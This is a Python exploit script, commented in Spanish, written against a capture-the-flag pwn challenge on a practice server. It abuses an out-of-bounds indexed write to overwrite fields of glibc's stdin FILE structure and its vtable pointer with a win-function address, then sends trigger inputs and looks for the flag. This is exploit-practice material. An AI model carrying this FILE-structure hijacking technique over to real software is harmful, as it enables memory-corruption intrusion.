#!/usr/bin/env python3
import socket
import time
import sys

host = "svc.pwnable.xyz"
port = 30029

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(30)

print("Intentando conectar...")
try:
    s.connect((host, port))
except Exception as e:
    print(f"Error conectando: {e}")
    sys.exit(1)

banner = s.recv(1024)
print(banner.decode())

win = 0xa21

print("\n" + "="*60)
print("Nueva estrategia: House of Force style")
print("="*60)

# Tal vez necesito sobrescribir MÚLTIPLES campos de stdin
# para que cuando scanf falle o termine, use alguno de ellos

# stdin structure offsets que puedo alcanzar:
# -9: stdin+184
# -8: stdin+192
# -7: stdin+200  
# -6: stdin+208
# -5: stdin+216 (probablemente antes de vtable)
# -4: stdin+224 (vtable pointer, fuera de _IO_FILE)

print("\nSobrescribiendo múltiples campos de stdin con win...")

fields_to_overwrite = [
    (-9, "stdin+184"),
    (-8, "stdin+192"),
    (-7, "stdin+200"),
    (-6, "stdin+208"),
    (-5, "stdin+216"),
]

for offset, desc in fields_to_overwrite:
    b = abs(offset) * 0x999
    a = win ^ b
    payload = f"{a} {b} {offset}\n"
    print(f"  {desc} (offset {offset})")
    s.sendall(payload.encode())
    time.sleep(0.15)
    try:
        s.recv(1024, socket.MSG_DONTWAIT)
    except:
        pass

print("\nTambién vtable...")
result_base = 0x202200
fake_vtable = result_base + 16  # result[2]

b = 0x5555555555555555
a = fake_vtable ^ b
payload = f"{a} {b} -4\n"
s.sendall(payload.encode())
time.sleep(0.2)

print("\nPoblando result[] con win...")
for i in range(1, 10):
    b = i * 321
    a = win ^ b
    s.sendall(f"{a} {b} {i}\n".encode())
    time.sleep(0.1)

print("\nTriggerando con diferentes inputs...")

triggers = [
    ("input normal", "5 10 2\n"),
    ("provocar error scanf", "AAA BBB CCC\n"),
    ("un solo número", "12345\n"),
    ("dos números", "1 2\n"),
    ("exit con a=0", "0 1 1\n"),
]

for desc, trig in triggers:
    print(f"\n  {desc}: {repr(trig.strip())}")
    try:
        s.sendall(trig.encode())
        time.sleep(0.8)
        
        data = b""
        try:
            s.settimeout(2)
            data = s.recv(8192)
        except:
            pass
        
        if data:
            decoded = data.decode()
            print(f"    Respuesta: {decoded[:150]}")
            if "flag" in decoded.lower() or "FLAG" in decoded or "pwn" in decoded:
                print("\n" + "="*60)
                print("ENCONTRADO:")
                print(decoded)
                print("="*60)
                sys.exit(0)
        else:
            print("    (sin respuesta/crash)")
            
    except BrokenPipeError:
        print("    CRASH - conexión cerrada")
        break
    except Exception as e:
        print(f"    Error: {e}")
        break

s.close()
print("\nNo se obtuvo la flag en este intento")